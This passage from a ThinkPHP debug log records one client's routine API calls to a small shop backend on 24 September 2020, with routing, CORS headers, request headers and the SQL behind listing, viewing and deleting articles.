  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '18',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000415s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000559s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 18 [ RunTime:0.001917s ]
---------------------------------------------------------------

[2020-09-24T16:56:53+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004920s] [吞吐率：203.25req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000417s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000569s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000256s ]
---------------------------------------------------------------

[2020-09-24T16:56:57+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005055s] [吞吐率：197.83req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000445s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000574s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000259s ]
---------------------------------------------------------------

[2020-09-24T16:57:36+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005151s] [吞吐率：194.14req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000413s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000607s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000249s ]
---------------------------------------------------------------

[2020-09-24T16:58:29+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004742s] [吞吐率：210.89req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000429s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000628s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000242s ]
---------------------------------------------------------------

[2020-09-24T17:12:29+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005180s] [吞吐率：193.05req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000431s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000620s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000248s ]
---------------------------------------------------------------

[2020-09-24T17:12:29+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004404s] [吞吐率：227.06req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000402s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000605s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000236s ]
---------------------------------------------------------------

[2020-09-24T17:12:30+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/1
[运行时间：0.004270s] [吞吐率：234.19req/s] [内存消耗：844.80kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '1',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000421s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000587s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000300s ]
---------------------------------------------------------------

[2020-09-24T17:18:55+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/1
[运行时间：0.005071s] [吞吐率：197.19req/s] [内存消耗：844.80kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '1',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000431s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000635s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000334s ]
---------------------------------------------------------------

[2020-09-24T17:18:58+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005219s] [吞吐率：191.61req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000440s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000566s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000299s ]
---------------------------------------------------------------

[2020-09-24T17:19:00+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/1
[运行时间：0.004258s] [吞吐率：234.86req/s] [内存消耗：844.76kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '1',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000440s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000561s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000294s ]
---------------------------------------------------------------

[2020-09-24T17:19:03+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/20
[运行时间：0.004677s] [吞吐率：213.81req/s] [内存消耗：844.60kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '20',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '20',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000449s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000582s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 20 LIMIT 1 [ RunTime:0.000296s ]
---------------------------------------------------------------

[2020-09-24T17:25:57+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005010s] [吞吐率：199.60req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000392s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000609s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000242s ]
---------------------------------------------------------------

[2020-09-24T17:25:58+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.004403s] [吞吐率：227.11req/s] [内存消耗：912.55kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000440s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000562s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000262s ]
---------------------------------------------------------------

[2020-09-24T17:26:00+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/1
[运行时间：0.004984s] [吞吐率：200.65req/s] [内存消耗：844.80kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '1',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000430s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000589s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000286s ]
---------------------------------------------------------------

[2020-09-24T18:02:33+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/22
[运行时间：0.002639s] [吞吐率：378.92req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
